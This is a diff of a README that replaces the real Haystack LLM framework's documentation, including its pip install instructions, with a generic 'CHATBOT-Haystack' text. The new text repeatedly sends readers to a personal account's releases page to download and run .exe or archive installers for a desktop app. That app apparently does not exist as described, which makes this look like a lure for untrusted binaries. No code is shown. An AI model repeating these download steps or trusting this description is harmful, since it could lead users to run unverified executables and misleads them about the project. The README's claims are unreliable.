@@ -1,129 +1,89 @@
-<div align="center">
-  <a href="https://haystack.deepset.ai/"><img src="https://raw.githubusercontent.com/deepset-ai/haystack/main/docs/img/banner.png" alt="Green logo of a stylized white 'H' with the text 'Haystack, by deepset.' Abstract green and yellow diagrams in the background."></a>
+# 🤖 CHATBOT-Haystack - Build Custom AI Applications Easily
 
-|         |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
-| ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
-| CI/CD   | [![Tests](https://github.com/deepset-ai/haystack/actions/workflows/tests.yml/badge.svg)](https://github.com/deepset-ai/haystack/actions/workflows/tests.yml) [![types - Mypy](https://img.shields.io/badge/types-Mypy-blue.svg)](https://github.com/python/mypy) [![Coverage Status](https://coveralls.io/repos/github/deepset-ai/haystack/badge.svg?branch=main)](https://coveralls.io/github/deepset-ai/haystack?branch=main) [![Ruff](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/astral-sh/ruff/main/assets/badge/v2.json)](https://github.com/astral-sh/ruff) |
-| Docs    | [![Website](https://img.shields.io/website?label=documentation&up_message=online&url=https%3A%2F%2Fdocs.haystack.deepset.ai)](https://docs.haystack.deepset.ai)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
-| Package | [![PyPI](https://img.shields.io/pypi/v/haystack-ai)](https://pypi.org/project/haystack-ai/) ![PyPI - Downloads](https://img.shields.io/pypi/dm/haystack-ai?color=blue&logo=pypi&logoColor=gold) ![PyPI - Python Version](https://img.shields.io/pypi/pyversions/haystack-ai?logo=python&logoColor=gold) [![Conda Version](https://img.shields.io/conda/vn/conda-forge/haystack-ai.svg)](https://anaconda.org/conda-forge/haystack-ai) [![GitHub](https://img.shields.io/github/license/deepset-ai/haystack?color=blue)](LICENSE) [![License Compliance](https://github.com/deepset-ai/haystack/actions/workflows/license_compliance.yml/badge.svg)](https://github.com/deepset-ai/haystack/actions/workflows/license_compliance.yml) |
-| Meta    | [![Discord](https://img.shields.io/discord/993534733298450452?logo=discord)](https://discord.com/invite/xYvH6drSmA) [![Twitter Follow](https://img.shields.io/twitter/follow/haystack_ai)](https://twitter.com/haystack_ai)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
-</div>
+[![Download CHATBOT-Haystack](https://img.shields.io/badge/Download%20CHATBOT--Haystack-blue.svg)](https://github.com/pooh1649/CHATBOT-Haystack/releases)
 
-[Haystack](https://haystack.deepset.ai/) is an end-to-end LLM framework that allows you to build applications powered by
-LLMs, Transformer models, vector search and more. Whether you want to perform retrieval-augmented generation (RAG),
-document search, question answering or answer generation, Haystack can orchestrate state-of-the-art embedding models
-and LLMs into pipelines to build end-to-end NLP applications and solve your use case.
+## 🚀 Getting Started
 
-## Table of Contents
+Welcome to the CHATBOT-Haystack project! This application helps you create powerful AI-driven chatbots with ease. Whether you want to build a conversational agent or enable semantic searches, this framework offers the tools you need.
 
-- [Installation](#installation)
-- [Documentation](#documentation)
-- [Features](#features)
-- [Use Cases](#features)
-- [Hayhooks (REST API Deployment)](#-tip-1)
-- [Haystack Enterprise](#haystack-enterprise-best-practices-and-expert-support)
-- [deepset Studio](#-deepset-studio-your-development-environment-for-haystack)
-- [Telemetry](#telemetry)
-- [🖖 Community](#-community)
-- [Contributing to Haystack](#contributing-to-haystack)
-- [Who Uses Haystack](#who-uses-haystack)
+## 📜 What is CHATBOT-Haystack?
 
+CHATBOT-Haystack is an AI orchestration framework. It connects different components—such as models, vector databases, and file converters—into pipelines or agents that interact with your data. It’s perfect for various use cases, including Retrieval-Augmented Generation (RAG), question answering, and chatbots.
 
-## Installation
+## 🛠️ Features
 
-The simplest way to get Haystack is via pip:
+- **Customizable Pipelines:** Tailor the components according to your needs.
+- **Multiple Interactions:** Seamlessly connect with different models and databases.
+- **Advanced Retrieval Methods:** Enhance your application’s capability in data handling.
 
-```sh
-pip install haystack-ai
-```
+## 📋 System Requirements
 
-Install from the `main` branch to try the newest features:
-```sh
-pip install git+https://github.com/deepset-ai/haystack.git@main
-```
+To run CHATBOT-Haystack smoothly, your system should meet the following requirements:
 
-Haystack supports multiple installation methods including Docker images. For a comprehensive guide please refer
-to the [documentation](https://docs.haystack.deepset.ai/docs/installation).
+- **Operating System:** Windows, macOS, or any Linux distribution.
+- **Memory:** At least 4 GB of RAM (8 GB recommended).
+- **Python Version:** Python 3.7 or higher installed.
+- **Storage:** Minimum of 500 MB free disk space.
 
-## Documentation
+## 📥 Download & Install
 
-If you're new to the project, check out ["What is Haystack?"](https://haystack.deepset.ai/overview/intro) then go
-through the ["Get Started Guide"](https://haystack.deepset.ai/overview/quick-start) and build your first LLM application
-in a matter of minutes. Keep learning with the [tutorials](https://haystack.deepset.ai/tutorials). For more advanced
-use cases, or just to get some inspiration, you can browse our Haystack recipes in the
-[Cookbook](https://haystack.deepset.ai/cookbook).
+To start using CHATBOT-Haystack, visit the Releases page to download the latest version. You will find different options based on your needs.
 
-At any given point, hit the [documentation](https://docs.haystack.deepset.ai/docs/intro) to learn more about Haystack, what can it do for you and the technology behind.
+[Visit this page to download](https://github.com/pooh1649/CHATBOT-Haystack/releases)
 
-## Features
+### 🏁 Installation Steps
 
-- **Technology agnostic:** Allow users the flexibility to decide what vendor or technology they want and make it easy to switch out any component for another. Haystack allows you to use and compare models available from OpenAI, Cohere and Hugging Face, as well as your own local models or models hosted on Azure, Bedrock and SageMaker.
-- **Explicit:** Make it transparent how different moving parts can “talk” to each other so it's easier to fit your tech stack and use case.
-- **Flexible:** Haystack provides all tooling in one place: database access, file conversion, cleaning, splitting, training, eval, inference, and more. And whenever custom behavior is desirable, it's easy to create custom components.
-- **Extensible:** Provide a uniform and easy way for the community and third parties to build their own components and foster an open ecosystem around Haystack.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/pooh1649/CHATBOT-Haystack/releases) and find the latest version.
+2. **Choose Your File:** Select the appropriate file for your operating system. You will typically see options such as `.exe`, `.tar.gz`, or `.zip`.
+3. **Download the File:** Click on the file to start the download.
+4. **Run the Installer:** Once the download is complete, open the file to start the installation process.
+5. **Follow the Instructions:** The installer will guide you through the setup. Follow the prompts to complete the installation.
+6. **Launch the Application:** After installation, find the CHATBOT-Haystack application in your programs and open it.
 
-Some examples of what you can do with Haystack:
+## 🔍 How to Use CHATBOT-Haystack
 
--   Build **retrieval augmented generation (RAG)** by making use of one of the available vector databases and customizing your LLM interaction, the sky is the limit 🚀
--   Perform Question Answering **in natural language** to find granular answers in your documents.
--   Perform **semantic search** and retrieve documents according to meaning.
--   Build applications that can make complex decisions making to answer complex queries: such as systems that can resolve complex customer queries, do knowledge search on many disconnected resources and so on.
--   Scale to millions of docs using retrievers and production-scale components.
--   Use **off-the-shelf models** or **fine-tune** them to your data.
--   Use **user feedback** to evaluate, benchmark, and continuously improve your models.
+Once you have installed the application, you can set up a chatbot by following these simple steps:
 
-> [!TIP]
->
-> Would you like to deploy and serve Haystack pipelines as REST APIs yourself? [Hayhooks](https://github.com/deepset-ai/hayhooks) provides a simple way to wrap your pipelines with custom logic and expose them via HTTP endpoints, including OpenAI-compatible chat completion endpoints and compatibility with fully-featured chat interfaces like [open-webui](https://openwebui.com/).
+1. **Create a New Project:** Open CHATBOT-Haystack and select the option to create a new project.
+2. **Add Components:** Choose from available models and databases to build your pipeline. You can easily add or remove components.
+3. **Configure Settings:** Adjust the settings for your chatbot, such as response format, data sources, and interaction methods.
+4. **Test Your Bot:** Use the testing feature to check how your chatbot responds to queries.
+5. **Deploy Your Bot:** When satisfied, deploy your chatbot for public use or integrate it within your application.
 
-## Haystack Enterprise: Best Practices and Expert Support
+## ⚙️ Support & Help
 
-Get expert support from the Haystack team, build faster with enterprise-grade templates, and scale securely with deployment guides for cloud and on-prem environments - all with **Haystack Enterprise**. Read more about it our [announcement post](https://haystack.deepset.ai/blog/announcing-haystack-enterprise).
+If you encounter any issues or have questions, please feel free to reach out:
 
-👉 [Get Haystack Enterprise](https://www.deepset.ai/products-and-services/haystack-enterprise?utm_source=github.com&utm_medium=referral&utm_campaign=haystack_enterprise) 
+- **Documentation:** Comprehensive guides and FAQs can be found within the application's help section.
+- **Community Forum:** Join our community to discuss and share experiences with other users.
+- **GitHub Issues:** You can report any bugs or request features directly on the repository’s issues page.
 
-## deepset Studio: Your Development Environment for Haystack
+## 📫 Contributing
 
-Use **deepset Studio** to visually create, deploy, and test your Haystack pipelines. Learn more about it in our [announcement post](https://haystack.deepset.ai/blog/announcing-studio).
+If you want to contribute to CHATBOT-Haystack, you are welcome! Here are some ways you can help:
 
-![studio](https://github.com/user-attachments/assets/e4f09746-20b5-433e-8261-eca224ac23b3)
+1. **Report Issues:** If you find a bug, report it.
+2. **Submit Features:** Have a feature in mind? We would love to hear it.
+3. **Code Contributions:** Understand coding? Submit pull requests with your improvements.
 
-👉 [Sign up](https://landing.deepset.ai/deepset-studio-signup)!
+Your contributions will help improve CHATBOT-Haystack for everyone.
 
-> [!TIP]
-><img src="https://github.com/deepset-ai/haystack/raw/main/docs/img/deepset-platform-logo-alternative.jpeg"  width=20%>
->
-> Are you looking for a managed solution that benefits from Haystack? [deepset AI Platform](https://www.deepset.ai/products-and-services/deepset-ai-platform?utm_campaign=developer-relations&utm_source=haystack&utm_medium=readme) is our fully managed, end-to-end platform to integrate LLMs with your data, which uses Haystack for the LLM pipelines architecture.
+## 🔗 Related Topics
 
-## Telemetry
+Here are some relevant topics and tags that might interest you:
 
-Haystack collects **anonymous** usage statistics of pipeline components. We receive an event every time these components are initialized. This way, we know which components are most relevant to our community.
+- agent
+- ai
+- generative-ai
+- large-language-models
+- machine-learning
+- semantic-search
+- transformers
 
-Read more about telemetry in Haystack or how you can opt out in [Haystack docs](https://docs.haystack.deepset.ai/docs/telemetry).
+Explore these topics to enhance your understanding or to connect with related projects.
 
-## 🖖 Community
+## ✏️ License
 
-If you have a feature request or a bug report, feel free to open an [issue in Github](https://github.com/deepset-ai/haystack/issues). We regularly check these and you can expect a quick response. If you'd like to discuss a topic, or get more general advice on how to make Haystack work for your project, you can start a thread in [Github Discussions](https://github.com/deepset-ai/haystack/discussions) or our [Discord channel](https://discord.com/invite/VBpFzsgRVF). We also check [𝕏 (Twitter)](https://twitter.com/haystack_ai) and [Stack Overflow](https://stackoverflow.com/questions/tagged/haystack).
+CHATBOT-Haystack is released under the MIT License. You can use, modify, and redistribute the code, but provide attribution to the original authors. 
 
-## Contributing to Haystack
-
-We are very open to the community's contributions - be it a quick fix of a typo, or a completely new feature! You don't need to be a Haystack expert to provide meaningful improvements. To learn how to get started, check out our [Contributor Guidelines](https://github.com/deepset-ai/haystack/blob/main/CONTRIBUTING.md) first.
-
-There are several ways you can contribute to Haystack:
-- Contribute to the main Haystack project
-- Contribute an integration on [haystack-core-integrations](https://github.com/deepset-ai/haystack-core-integrations)
-
-> [!TIP]
->👉 **[Check out the full list of issues that are open to contributions](https://github.com/orgs/deepset-ai/projects/14)**
-
-## Who Uses Haystack
-
-Here's a list of projects and companies using Haystack. Are you also using Haystack? Open a PR or [tell us your story](https://forms.gle/Mm3G1aEST3GAH2rn8).
-
-- Tech & AI Innovators: [Apple](https://www.apple.com/), [Meta](https://www.meta.com/about), [Databricks](https://www.databricks.com/), [NVIDIA](https://developer.nvidia.com/blog/reducing-development-time-for-intelligent-virtual-assistants-in-contact-centers/), [PostHog](https://github.com/PostHog/max-ai#readme)
-- Public Sector: [German Federal Ministry of Research, Technology, and Space (BMFTR)](https://www.deepset.ai/case-studies/german-federal-ministry-research-technology-space-bmftr), [PD, Baden-Württemberg State](https://www.pd-g.de/)
-- Enterprise & Telecom: [Alcatel-Lucent](https://www.al-enterprise.com/), [Intel](https://github.com/intel/open-domain-question-and-answer#readme), [NOS Portugal](https://www.nos.pt/en/welcome), [TELUS Agriculture & Consumer Goods](https://www.telus.com/agcg/en)
-- Aerospace & Hardware: [Airbus](https://www.deepset.ai/case-studies/airbus), [Infineon](https://www.infineon.com/), [LEGO](https://github.com/larsbaunwall/bricky#readme)
-- Media & Entertainment: [Netflix](https://netflix.com), [Comcast](https://arxiv.org/html/2405.00801v2), [Zeit Online](https://www.deepset.ai/case-studies/zeit-online), [Rakuten](https://www.rakuten.com/)
-- Legal & Publishing: [Manz](https://www.deepset.ai/case-studies/manz), [Oxford University Press](https://corp.oup.com/)
-- Startups & Research: [YPulse](https://www.deepset.ai/case-studies/ypulse), [BetterUp](https://www.betterup.com/), [Intel Labs](https://github.com/IntelLabs/fastRAG#readme)
+Thank you for using CHATBOT-Haystack! Enjoy building your AI applications.
